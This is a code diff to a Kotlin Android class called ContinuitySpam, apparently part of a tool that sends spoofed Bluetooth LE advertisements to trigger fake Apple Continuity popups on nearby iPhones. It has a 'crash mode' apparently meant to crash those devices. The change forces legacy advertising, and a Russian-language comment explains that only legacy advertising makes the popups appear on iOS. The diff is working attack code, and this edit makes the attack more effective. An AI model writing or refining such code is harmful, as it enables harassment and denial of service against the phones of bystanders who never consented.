@@ -326,35 +326,41 @@ class ContinuitySpam(private val type: ContinuityType, var crashMode: Boolean = 
         return Helper.convertHexToByteArray(payloadHex)
     }
 
-    override fun start() {
-        executor.execute @androidx.annotation.RequiresPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE) {
-            val bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
-            if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
-                Log.e(TAG, "Bluetooth not available or not enabled")
-                return@execute
-            }
 
-            val advertiser = bluetoothAdapter.bluetoothLeAdvertiser
-            if (advertiser == null) {
-                Log.e(TAG, "BLE Advertising not supported")
-                return@execute
-            }
 
-            _isSpamming = true
-
-            val supportsExtendedAdvertising = Helper.canUseExtendedAdvertising()
-
-            val crashModeStr = if (crashMode) " [CRASH MODE]" else ""
-            Log.d(TAG, "Starting Continuity spam (Type: $type$crashModeStr, Extended: $supportsExtendedAdvertising)")
-
-            if (supportsExtendedAdvertising && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startExtendedAdvertising(bluetoothAdapter, advertiser)
-            } else {
-                startLegacyAdvertising(advertiser)
-            }
+    
+ override fun start() {
+    executor.execute @androidx.annotation.RequiresPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE) {
+        val bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
+        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
+            Log.e(TAG, "Bluetooth not available or not enabled")
+            return@execute
         }
-    }
 
+        val advertiser = bluetoothAdapter.bluetoothLeAdvertiser
+        if (advertiser == null) {
+            Log.e(TAG, "BLE Advertising not supported")
+            return@execute
+        }
+
+        _isSpamming = true
+
+        val crashModeStr = if (crashMode) " [CRASH MODE]" else ""
+        Log.d(TAG, "Starting Continuity spam (Type: $type$crashModeStr, using LEGACY advertising)")
+
+        // ВАЖНО: iOS Continuity popups работают ТОЛЬКО с Legacy Advertising
+        // Extended Advertising не триггерит попапы Apple
+        startLegacyAdvertising(advertiser)
+    }
+}
+
+
+
+
+
+
+
+    
     @androidx.annotation.RequiresApi(Build.VERSION_CODES.O)
     @androidx.annotation.RequiresPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE)
     private fun startExtendedAdvertising(adapter: BluetoothAdapter, advertiser: android.bluetooth.le.BluetoothLeAdvertiser) {
